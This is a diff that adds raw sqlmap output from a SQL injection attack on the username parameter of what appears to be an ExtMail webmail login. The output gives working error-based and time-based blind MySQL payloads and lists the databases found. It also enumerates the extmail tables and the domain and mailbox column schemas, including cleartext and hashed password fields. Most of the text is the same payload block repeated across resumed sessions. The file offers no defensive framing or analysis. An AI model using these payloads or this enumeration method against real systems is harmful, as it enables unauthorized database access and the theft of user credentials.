@@ -1,0 +1,166 @@
+sqlmap identified the following injection point(s) with a total of 1603 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL 5.0
+available databases [3]:
+[*] extmail
+[*] information_schema
+[*] test
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+Database: extmail
+[5 tables]
++----------------+
+| domain         |
+| alias          |
+| domain_manager |
+| mailbox        |
+| manager        |
++----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+Database: extmail
+Table: domain
+[21 columns]
++----------------------+--------------+
+| Column               | Type         |
++----------------------+--------------+
+| domain               | varchar(255) |
+| active               | tinyint(1)   |
+| can_signup           | tinyint(1)   |
+| createdate           | datetime     |
+| default_expire       | varchar(12)  |
+| default_netdiskquota | varchar(255) |
+| default_quota        | varchar(255) |
+| description          | varchar(255) |
+| disableimap          | smallint(1)  |
+| disablenetdisk       | smallint(1)  |
+| disablepop3          | smallint(1)  |
+| disablesmtp          | smallint(1)  |
+| disablesmtpd         | smallint(1)  |
+| disablewebmail       | smallint(1)  |
+| expiredate           | datetime     |
+| hashdirpath          | varchar(255) |
+| maxalias             | int(10)      |
+| maxnetdiskquota      | varchar(16)  |
+| maxquota             | varchar(16)  |
+| maxusers             | int(10)      |
+| transport            | varchar(255) |
++----------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+Database: extmail
+Table: mailbox
+[23 columns]
++------------------+--------------+
+| Column           | Type         |
++------------------+--------------+
+| domain           | varchar(255) |
+| active           | smallint(1)  |
+| clearpwd         | varchar(128) |
+| createdate       | datetime     |
+| disableimap      | smallint(1)  |
+| disablenetdisk   | smallint(1)  |
+| disablepop3      | smallint(1)  |
+| disablepwdchange | smallint(1)  |
+| disablesmtp      | smallint(1)  |
+| disablesmtpd     | smallint(1)  |
+| disablewebmail   | smallint(1)  |
+| expiredate       | datetime     |
+| gidnumber        | int(6)       |
+| homedir          | varchar(255) |
+| maildir          | varchar(255) |
+| mailhost         | varchar(255) |
+| name             | varchar(255) |
+| netdiskquota     | varchar(16)  |
+| password         | varchar(255) |
+| quota            | varchar(16)  |
+| uid              | varchar(255) |
+| uidnumber        | int(6)       |
+| username         | varchar(255) |
++------------------+--------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=' AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7170767671,(SELECT (ELT(6192=6192,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'IZYT'='IZYT&password=&Domain=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=' AND (SELECT * FROM (SELECT(SLEEP(5)))aWJu) AND 'RlzB'='RlzB&password=&Domain=1
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0.0
